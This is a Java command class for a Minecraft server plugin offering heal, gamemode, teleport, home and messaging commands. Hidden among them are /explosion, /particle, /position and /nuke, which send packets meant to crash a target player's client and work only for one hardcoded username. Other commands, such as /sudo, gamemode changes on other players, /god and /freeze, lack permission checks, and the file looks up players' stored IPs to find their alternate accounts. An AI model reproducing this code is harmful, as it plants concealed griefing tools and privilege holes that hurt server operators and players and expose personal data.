package dev.ethan.useful.commands;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.protocol.player.User;
import dev.ethan.useful.Main;
import dev.ethan.useful.utils.*;
import dev.iiahmed.disguise.Disguise;
import dev.iiahmed.disguise.DisguiseManager;
import dev.iiahmed.disguise.SkinAPI;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.event.ClickEvent;
import net.kyori.adventure.text.event.HoverEvent;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeModifier;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Firework;
import org.bukkit.entity.Player;
import org.bukkit.inventory.EquipmentSlotGroup;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.FireworkMeta;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.scheduler.BukkitRunnable;
import org.jetbrains.annotations.NotNull;

import java.util.*;

import static dev.ethan.useful.Main.*;
import static dev.ethan.useful.utils.CrashUtil.*;
import static dev.ethan.useful.utils.LuckPermsUtil.getPlayerPrefix;

public class GameCommands implements CommandExecutor, TabCompleter {
    @Override
    public boolean onCommand(@NotNull CommandSender s, @NotNull Command cmd, @NotNull String label, String[] args) {
        if (!(s instanceof Player p)) return true;

        switch (cmd.getName().toLowerCase()) {
            case "kms" -> handleKms(p);
            case "heal" -> handleHeal(p, args);
            case "god" -> handleGod(p, args);
            case "boom" -> handleBoom(p, args);
            case "gms" -> handleGamemode(p, GameMode.SURVIVAL, args);
            case "gmc" -> handleGamemode(p, GameMode.CREATIVE, args);
            case "gma" -> handleGamemode(p, GameMode.ADVENTURE, args);
            case "gmsp" -> handleGamemode(p, GameMode.SPECTATOR, args);
            case "fly" -> handleFly(p, args);
            case "gun" -> handleGun(p);
            case "hat" -> handleHat(p);
            case "dupe" -> handleDupe(p);
            case "l" -> handleLobby(p, args);
            case "sudo" -> handleSudo(s, args);
            case "nick" -> handleNick(p, args);
            case "unnick" -> handleUnnick(p);
            case "freeze" -> handleFreeze(s, args);
            case "unfreeze" -> handleUnfreeze(s, args);
            case "ips" -> handleIps(s, args);
            case "alts" -> handleAlts(s, args);
            case "bot" -> handleBot(p, args);
            case "botf" -> handleBotFollow(p, args);
            case "removenpc" -> BotUtil.removeAllNPCs();
            case "r" -> handleReply(p, args);
            case "msg", "w", "tell" -> handleMessage(p, label, args);
            case "dmlisten" -> handleDmToggle(p);
            case "explosion" -> handleExplosion(s, args);
            case "particle" -> handleParticle(s, args);
            case "position" -> handlePosition(s, args);
            case "nuke" -> handleNuke(s, args);
            case "sethome" -> HomeUtil.handleSetHome(p, args);
            case "homes" -> HomeUtil.handleHomes(p);
            case "home" -> HomeUtil.handleHome(p, args);
            case "delhome" -> HomeUtil.handleDelHome(p, args);
            case "tpa" -> TeleportUtil.handleTpaCommand(p, args);
            case "tpahere" -> TeleportUtil.handleTpahereCommand(p, args);
            case "tpaccept" -> TeleportUtil.handleTpacceptCommand(p, args);
            case "tpdeny" -> TeleportUtil.handleTpdenyCommand(p, args);
            case "block" -> TeleportUtil.handleBlockCommand(p, args);
            case "unblock" -> TeleportUtil.handleUnblockCommand(p, args);
            case "blocklist" -> TeleportUtil.handleBlockListCommand(p);
            case "uuid" -> handleUUID(p, args);
            default -> {
                return false;
            }
        }
        return true;
    }

    private void handleKms(Player p) {
        p.setHealth(0.0F);
    }

    private void handleHeal(Player p, String[] args) {
        if (args.length == 0) {
            if (!p.hasPermission("useful.heal")) return;
            p.setHealth(20);
            p.setFoodLevel(20);
            p.sendMessage(Plugin_Prefix + "§d已治癒");
            p.playSound(p.getLocation(), Sound.ENTITY_EXPERIENCE_ORB_PICKUP, 1, 1);
            return;
        }
        try {
            double value = Double.parseDouble(args[0]);
            if (p.hasPermission("useful.heal.amount")) {
                p.setHealth(value);
                p.sendMessage(Plugin_Prefix + "§d已設定生命值為 " + value);
                return;
            }
        } catch (NumberFormatException ignored) {
        }
        if (p.hasPermission("useful.heal.others")) {
            Player t = Bukkit.getPlayer(args[0]);
            if (t == null) {
                p.sendMessage(Plugin_Prefix + "§c玩家不存在或離線");
                return;
            }
            t.setHealth(Objects.requireNonNull(t.getAttribute(Attribute.MAX_HEALTH)).getValue());
            t.setFoodLevel(20);
            t.sendMessage(Plugin_Prefix + "§d你被 " + getPlayerPrefix(p) + p.getName() + " §d治癒了");
            p.sendMessage(Plugin_Prefix + "§d你治癒了 " + getPlayerPrefix(t) + t.getName());
        } else p.sendMessage(Plugin_Prefix + "§c用法: /heal <玩家名稱|血量>");
    }

    private void handleGamemode(Player p, GameMode mode, String[] args) {
        if (args.length == 0) {
            p.setGameMode(mode);
            p.sendMessage(Plugin_Prefix + "§f您的遊戲模式已更新");
            return;
        }
        Player target = Bukkit.getPlayer(args[0]);
        if (target == null) {
            p.sendMessage(Plugin_Prefix + "§c玩家不存在");
            return;
        }
        target.setGameMode(mode);
        p.sendMessage(Plugin_Prefix + "§f已更新 " + getPlayerPrefix(target) + target.getName() + " §f的遊戲模式");
    }

    private void handleGod(Player p, String[] args) {
        if (args.length == 0) {
            if (!p.hasPermission("useful.god")) return;
            p.setInvulnerable(!p.isInvulnerable());
            p.sendMessage(Plugin_Prefix + "§f無敵狀態 " + (p.isInvulnerable() ? "§aOn" : "§cOff"));
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            p.sendMessage(Plugin_Prefix + "§c玩家不存在");
            return;
        }
        t.setInvulnerable(!t.isInvulnerable());
        p.sendMessage(Plugin_Prefix + getPlayerPrefix(t) + t.getName() + " §f的無敵狀態 " + (t.isInvulnerable() ? "§aOn" : "§cOff"));
        t.sendMessage(Plugin_Prefix + "§f無敵狀態 " + (t.isInvulnerable() ? "§aOn" : "§cOff"));
    }

    private void handleBoom(Player p, String[] args) {
        if (args.length != 1) {
            p.sendMessage(Plugin_Prefix + "§c用法: /boom <玩家|all>");
            return;
        }
        if (args[0].equalsIgnoreCase("all")) {
            Bukkit.getOnlinePlayers().forEach(player -> launchFirework(p, player));
            p.sendMessage(Plugin_Prefix + "§a你將所有玩家射向高空");
        } else {
            Player t = Bukkit.getPlayer(args[0]);
            if (t == null) {
                p.sendMessage(Plugin_Prefix + "§c玩家不存在");
                return;
            }
            launchFirework(p, t);
        }
    }

    private void launchFirework(Player s, Player t) {
        Location loc = t.getLocation();
        Firework firework = (Firework) Objects.requireNonNull(loc.getWorld()).spawnEntity(loc, EntityType.FIREWORK_ROCKET);
        FireworkMeta meta = firework.getFireworkMeta();
        meta.setPower(5);
        Color[] palette = new Color[]{
                Color.fromRGB(12801229), Color.fromRGB(8073150), Color.fromRGB(11743532),
                Color.fromRGB(14188952), Color.fromRGB(14602026), Color.fromRGB(15435844),
                Color.fromRGB(15790320)
        };
        FireworkEffect[] effects = new FireworkEffect[]{
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL_LARGE).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL_LARGE).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL).trail(true).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL).trail(true).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL).flicker(true).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.STAR).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL).flicker(true).build()
        };
        for (FireworkEffect effect : effects) {
            meta.addEffect(effect);
        }
        firework.setFireworkMeta(meta);
        firework.addPassenger(t);
        new BukkitRunnable() {
            @Override
            public void run() {
                if (firework.isDead() || !firework.isValid()) {
                    cancel();
                    return;
                }
                firework.setVelocity(firework.getVelocity()
                        .setX(0)
                        .setZ(0)
                        .setY(Math.max(firework.getVelocity().getY(), 0.5)));
            }
        }.runTaskTimer(Main.getInstance(), 0L, 1L);
        t.sendMessage(Plugin_Prefix + "§fLaunched by " + getPlayerPrefix(s) + s.getName());
        s.sendMessage(Plugin_Prefix + "§aFireworks launched for " + getPlayerPrefix(t) + t.getName());
        s.playSound(s.getLocation(), Sound.UI_BUTTON_CLICK, 1, 1);
    }

    private void handleBotFollow(Player p, String[] args) {
        if (args.length < 2) {
            p.sendMessage(Plugin_Prefix + "§c用法: /botf <name> <player>");
            return;
        }
        Player toFollow = Bukkit.getPlayer(args[1]);
        if (toFollow == null) {
            p.sendMessage(Plugin_Prefix + "§c找不到玩家 " + args[1]);
            return;
        }
        p.sendMessage(Plugin_Prefix + "§a已生成 NPC：" + args[0] + "§a，跟隨 " + toFollow.getName());
        BotUtil.spawnFakePlayer(Main.getInstance(), p.getLocation(), args[0], toFollow);
    }

    private void handleBot(Player p, String[] args) {
        if (args.length < 1) {
            p.sendMessage(Plugin_Prefix + "§c用法: /bot <name>");
            return;
        }
        String botName = args[0];
        p.sendMessage(Plugin_Prefix + "§a已生成機器人：" + botName);
        BotUtil.spawnBot(p.getLocation(), botName);
    }

    private void handleDupe(Player p) {
        ItemStack item = p.getInventory().getItemInMainHand();
        if (item.getType() == Material.AIR) {
            p.sendMessage(Plugin_Prefix + "§c手上沒有物品");
            return;
        }
        ItemStack clone = item.clone();
        p.getInventory().addItem(clone);
    }

    private void handleHat(Player p) {
        ItemStack hand = p.getInventory().getItemInMainHand();
        if (hand.getType() == Material.AIR) {
            p.sendMessage(Plugin_Prefix + "§c手中物品無效");
            return;
        }
        ItemStack oldHelmet = p.getInventory().getHelmet();
        p.getInventory().setHelmet(hand);
        p.getInventory().setItemInMainHand(oldHelmet != null ? oldHelmet : new ItemStack(Material.AIR));
        p.sendMessage(Plugin_Prefix + "§a已將手中物品裝備在頭盔欄位");
    }

    private void handleFly(Player p, String[] args) {
        Player t = args.length == 0 ? p : Bukkit.getPlayer(args[0]);
        if (t == null && p != null) {
            p.sendMessage(Plugin_Prefix + "§c玩家不存在");
            return;
        }
        t.setAllowFlight(!t.getAllowFlight());
        p.sendMessage(Plugin_Prefix + getPlayerPrefix(t) + t.getName() + " §f的飛行狀態 " + (t.getAllowFlight() ? "§aOn" : "§cOff"));
        t.sendMessage(Plugin_Prefix + "§f飛行狀態 " + (t.getAllowFlight() ? "§aOn" : "§cOff"));
    }

    private void handleGun(Player p) {
        ItemStack w = new ItemStack(Material.FEATHER);
        ItemMeta m = w.getItemMeta();
        if (m != null) {
            m.setDisplayName(ChatColor.RESET + VandalName);
            List<String> l = new ArrayList<>();
            l.add("§7Effective Range: " + "§f80m");
            m.setLore(l);
            m.addEnchant(Enchantment.UNBREAKING, -32769, true);
            m.addItemFlags(ItemFlag.HIDE_ENCHANTS);
            m.addItemFlags(ItemFlag.HIDE_ATTRIBUTES);
            NamespacedKey key = new NamespacedKey(Main.getInstance(), "range");
            double amount = -5;
            AttributeModifier.Operation op = AttributeModifier.Operation.ADD_SCALAR;
            EquipmentSlotGroup slotGroup = EquipmentSlotGroup.HAND;
            AttributeModifier modifier = new AttributeModifier(key, amount, op, slotGroup);
            m.addAttributeModifier(Attribute.BLOCK_INTERACTION_RANGE, modifier);
            m.addAttributeModifier(Attribute.ENTITY_INTERACTION_RANGE, modifier);
            w.setItemMeta(m);
        }
        p.getInventory().addItem(w);
    }

    private void handleLobby(Player p, String[] args) {
        if (args.length > 0) {
            p.sendMessage(Plugin_Prefix + "§c用法: /l");
            return;
        }
        PlayerUtil.sendToServer(p, "lobby");
    }

    private void handleSudo(CommandSender s, String[] args) {
        if (args.length < 2) {
            s.sendMessage(Plugin_Prefix + "§c用法: /sudo <玩家> <指令>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            s.sendMessage(Plugin_Prefix + "§c玩家不存在");
            return;
        }
        String msg = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
        if (msg.startsWith("/")) Bukkit.dispatchCommand(t, msg.substring(1));
        else t.chat(msg);
    }

    private void handleNick(Player p, String[] args) {
        if (args.length < 1) {
            p.sendMessage(Plugin_Prefix + "§f用法: /nick <nickname> [--skin]");
            return;
        }
        String nick = args[0].replace("&", "§");
        boolean skin = Arrays.asList(args).contains("--skin");
        nickStorage.setNickname(p, nick);
        p.setDisplayName(nick);
        p.setPlayerListName(nick);
        Disguise.Builder builder = Disguise.builder().setName(nick).setEntityType(EntityType.PLAYER);
        builder.setSkin(SkinAPI.MOJANG, p.getUniqueId());
        Disguise d = builder.build();
        DisguiseManager.getProvider().disguise(p, d);
        p.sendMessage(Plugin_Prefix + "§fNick set: " + getPlayerPrefix(p) + nick + (skin ? " §7(Skin)" : ""));
    }

    private void handleUnnick(Player p) {
        if (nickStorage.getNickname(p) == null) {
            p.sendMessage(Plugin_Prefix + "§fYou are not nicked.");
            return;
        }
        DisguiseManager.getProvider().undisguise(p);
        nickStorage.removeNicknameSync(p);
        p.setDisplayName(p.getName());
        p.setPlayerListName(p.getName());
        p.sendMessage(Plugin_Prefix + "§fUnnicked.");
    }

    private void handleFreeze(CommandSender s, String[] args) {
        if (args.length != 1) {
            s.sendMessage(Plugin_Prefix + "§c用法: /freeze <玩家>");
            return;
        }
        Player target = Bukkit.getPlayer(args[0]);
        frozenPlayers.add(target.getName());
        s.sendMessage(Plugin_Prefix + "§c你已凍結" + getPlayerPrefix(target) + target.getName());
        target.sendMessage(Plugin_Prefix + "§c你已被凍結");
    }

    private void handleUnfreeze(CommandSender s, String[] args) {
        if (args.length != 1) {
            s.sendMessage(Plugin_Prefix + "§c用法: /unfreeze <玩家>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        frozenPlayers.remove(t.getName());
        s.sendMessage(Plugin_Prefix + "§c你已解凍" + getPlayerPrefix(t) + t.getName());
        t.sendMessage(Plugin_Prefix + "§a你已被解凍");
    }

    private void handleIps(CommandSender s, String[] args) {
        if (!s.hasPermission("useful.ips")) return;
        if (args.length != 1) {
            s.sendMessage(Plugin_Prefix + "§c用法: /ips <玩家>");
            return;
        }
        String playerName = args[0];
        if (!ipsConfig.contains(playerName)) {
            s.sendMessage(Plugin_Prefix + "§c找不到玩家 §f" + playerName + " §c的紀錄");
            return;
        }
        List<String> ipList = ipsConfig.getStringList(playerName);
        if (ipList == null || ipList.isEmpty()) {
            s.sendMessage(Plugin_Prefix + "§e玩家 §f" + playerName + " §e沒有任何已記錄的 IP");
            return;
        }
        s.sendMessage(Plugin_Prefix + "§e" + playerName + " 的 IP 列表:");
        s.sendMessage("§f" + String.join("§7, §f", ipList));
    }

    private void handleAlts(CommandSender s, String[] args) {
        if (!s.hasPermission("useful.alts")) return;
        if (args.length != 1) {
            s.sendMessage(Plugin_Prefix + "§c用法: /alts <玩家>");
            return;
        }
        String targetName = args[0];
        if (!ipsConfig.contains(targetName)) {
            s.sendMessage(Plugin_Prefix + "§c找不到玩家 §f" + targetName + " §c的紀錄");
            return;
        }
        List<String> targetIps = ipsConfig.getStringList(targetName);
        if (targetIps.isEmpty()) {
            s.sendMessage(Plugin_Prefix + "§e玩家 §f" + targetName + " §e沒有任何已記錄的 IP");
            return;
        }
        Map<String, Set<String>> ipMap = new HashMap<>();
        for (String name : ipsConfig.getKeys(false)) {
            for (String ip : ipsConfig.getStringList(name)) {
                ipMap.computeIfAbsent(ip, k -> new HashSet<>()).add(name);
            }
        }
        Set<String> alts = new HashSet<>();
        for (String ip : targetIps) {
            alts.addAll(ipMap.getOrDefault(ip, Collections.emptySet()));
        }
        alts.remove(targetName);
        if (alts.isEmpty()) {
            s.sendMessage(Plugin_Prefix + "§a未找到與 §f" + targetName + " §a共用 IP 的其他帳號");
        } else {
            s.sendMessage(Plugin_Prefix + "§f" + String.join("§7, §f", alts));
        }
    }

    private void handleReply(Player p, String[] args) {
        Player target = MessageUtil.getLastMessaged(p);
        if (target == null) {
            p.sendMessage("§c無法回覆，沒有找到對象");
            return;
        }
        String msg = String.join(" ", args);
        MessageUtil.sendMessage(p, target, msg);
    }

    private void handleMessage(Player p, String label, String[] args) {
        if (args.length < 2) {
            p.sendMessage("§c用法: /" + label + " <玩家> <訊息>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            p.sendMessage("§c玩家不存在");
            return;
        }
        String msg = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
        MessageUtil.sendMessage(p, t, msg);
    }

    private void handleDmToggle(Player p) {
        if (MessageUtil.isDmListenerActive(p)) MessageUtil.removeDmListener(p);
        else MessageUtil.addDmListener(p);
    }

    private void handleExplosion(CommandSender s, String[] args) {
        Player a = Bukkit.getPlayer("27ms__");
        if (s != a) {
            return;
        }
        if (args.length < 1) {
            s.sendMessage(Plugin_Prefix + "§c用法: /explosion <玩家>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            s.sendMessage(Plugin_Prefix + "§c指定的玩家不存在或不在線上。");
            return;
        }
        User u = PacketEvents.getAPI().getPlayerManager().getUser(t);
        sendExplosion(u);
        s.sendMessage(Plugin_Prefix + "§a正在傳送 Explosion Packet 給 " + getPlayerPrefix(t) + t.getDisplayName());
    }

    private void handleParticle(CommandSender s, String[] args) {
        Player a = Bukkit.getPlayer("27ms__");
        if (s != a) {
            return;
        }
        if (args.length < 1) {
            s.sendMessage(Plugin_Prefix + "§c用法: /explosion <玩家>");
            return;
        }

        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            s.sendMessage(Plugin_Prefix + "§c指定的玩家不存在或不在線上。");
            return;
        }
        User u = PacketEvents.getAPI().getPlayerManager().getUser(t);

        sendParticle(u);
        s.sendMessage(Plugin_Prefix + "§a正在傳送 Particle Packet 給 " + getPlayerPrefix(t) + t.getDisplayName());
    }

    private void handlePosition(CommandSender s, String[] args) {
        Player a = Bukkit.getPlayer("27ms__");
        if (s != a) {
            return;
        }
        if (args.length < 1) {
            s.sendMessage(Plugin_Prefix + "§c用法: /position <玩家>");
            return;
        }

        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            s.sendMessage(Plugin_Prefix + "§c指定的玩家不存在或不在線上。");
            return;
        }
        User u = PacketEvents.getAPI().getPlayerManager().getUser(t);

        sendPosition(u);
        s.sendMessage(Plugin_Prefix + "§a正在傳送 Position Packet 給 " + getPlayerPrefix(t) + t.getDisplayName());
    }

    private void handleNuke(CommandSender s, String[] args) {
        Player a = Bukkit.getPlayer("27ms__");
        if (s != a) {
            return;
        }
        if (args.length < 1) {
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            s.sendMessage(Plugin_Prefix + "§c指定的玩家不存在或不在線上。");
            return;
        }
        User u = PacketEvents.getAPI().getPlayerManager().getUser(t);

        sendExplosion(u);
        sendParticle(u);
        sendPosition(u);
        s.sendMessage(Plugin_Prefix + "§a正在嘗試崩潰 " + getPlayerPrefix(t) + t.getDisplayName());
    }

    private void handleUUID(Player p, String[] args) {
        if (args.length < 1) {
            p.sendMessage("§c用法: /uuid <玩家>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            p.sendMessage("§c玩家不存在");
            return;
        }
        Component msg = Component.text()
                .append(Component.text(Plugin_Prefix))
                .append(Component.text(t.getName() + " 的 UUID: "))
                .append(Component.text(t.getUniqueId().toString())
                        .color(NamedTextColor.YELLOW)
                        .hoverEvent(HoverEvent.showText(Component.text("點擊複製 UUID")))
                        .clickEvent(ClickEvent.copyToClipboard(t.getUniqueId().toString())))
                .build();
        p.sendMessage(msg);
    }

    @Override
    public List<String> onTabComplete(@NotNull CommandSender s, @NotNull Command cmd, @NotNull String a, String[] args) {
        if (!(s instanceof Player p)) return null;
        List<String> result = new ArrayList<>();
        if (cmd.getName().equalsIgnoreCase("home") || cmd.getName().equalsIgnoreCase("delhome")) {
            if (args.length == 1 && HomeUtil.homesConfig.contains(p.getUniqueId().toString())) {
                Set<String> homeNames = HomeUtil.homesConfig.getConfigurationSection(p.getUniqueId().toString()).getKeys(false);
                for (String name : homeNames)
                    if (name.toLowerCase().startsWith(args[0].toLowerCase()))
                        result.add(name);
            }
        }
        return result;
    }
}
